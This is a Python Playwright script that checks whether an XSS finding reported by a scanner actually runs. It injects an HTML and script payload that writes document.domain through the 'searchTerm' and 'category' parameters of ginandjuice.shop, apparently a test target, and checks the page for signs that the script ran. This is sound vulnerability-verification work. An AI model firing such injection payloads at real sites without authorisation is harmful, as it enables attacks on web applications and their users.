#!/usr/bin/env python3
"""
Verify the XSS findings from the scan are REAL
Test if the reported payload actually executes JavaScript
"""
import asyncio
from playwright.async_api import async_playwright

async def verify_real_xss():
    """Test the exact payload the agent reported as validated"""
    
    # The EXACT payload from the scan results
    payload = '<div style="color:red;font-size:30px;position:fixed;top:0;left:0;z-index:9999;background:yellow;padding:20px">BUGTRACE-XSS-CONFIRMED: <script>document.write(document.domain)</script></div>'
    
    test_params = [
        ("searchTerm", payload),
        ("category", payload),
    ]
    
    print("=" * 70)
    print("VERIFYING XSS FINDINGS ARE REAL")
    print("=" * 70)
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=False)
        page = await browser.new_page()
        
        for param, test_payload in test_params:
            url = f"https://ginandjuice.shop/catalog?{param}={test_payload}"
            
            print(f"\n[Testing {param}]")
            print(f"  Payload: {test_payload[:60]}...")
            
            # Track if alert triggers (real XSS)
            alert_triggered = False
            dialog_message = None
            
            def handle_dialog(dialog):
                nonlocal alert_triggered, dialog_message
                alert_triggered = True
                dialog_message = dialog.message
                asyncio.create_task(dialog.dismiss())
            
            page.on('dialog', handle_dialog)
            
            # Track DOM writes (document.write)
            dom_writes = []
            
            try:
                await page.goto(url, wait_until='load', timeout=10000)
                await asyncio.sleep(2)
                
                # Check if script executed
                content = await page.content()
                
                # Check visual marker
                has_visual_marker = "BUGTRACE-XSS-CONFIRMED" in content
                
                # Check if DOM was modified
                dom_modified = await page.evaluate("""
                    () => {
                        // Check if document.domain was written
                        return document.body.textContent.includes(window.location.hostname);
                    }
                """)
                
                # Check if the div with the fixed position exists visibly
                div_visible = await page.evaluate("""
                    () => {
                        const div = document.querySelector('div[style*="position:fixed"]');
                        return div !== null && div.offsetParent !== null;
                    }
                """)
                
                print(f"\n  Results:")
                print(f"    Alert triggered: {'✅ YES' if alert_triggered else '❌ NO'}")
                if alert_triggered:
                    print(f"    Alert message: {dialog_message}")
                print(f"    Visual marker in HTML: {'✅ YES' if has_visual_marker else '❌ NO'}")
                print(f"    DOM modified: {'✅ YES' if dom_modified else '❌ NO'}")
                print(f"    Div visible on page: {'✅ YES' if div_visible else '❌ NO'}")
                
                # Final verdict
                is_real_xss = alert_triggered or (has_visual_marker and div_visible)
                
                if is_real_xss:
                    print(f"\n  ✅ VERDICT: REAL XSS - JavaScript executed")
                else:
                    print(f"\n  ❌ VERDICT: FALSE POSITIVE - No JS execution")
                
                # Take screenshot
                screenshot = f"/tmp/verify_{param}_xss.png"
                await page.screenshot(path=screenshot)
                print(f"  Screenshot: {screenshot}")
                
            except Exception as e:
                print(f"  ❌ Error: {str(e)[:60]}")
        
        await browser.close()
    
    print(f"\n{'='*70}")
    print("VERIFICATION COMPLETE")
    print(f"{'='*70}")

if __name__ == "__main__":
    asyncio.run(verify_real_xss())
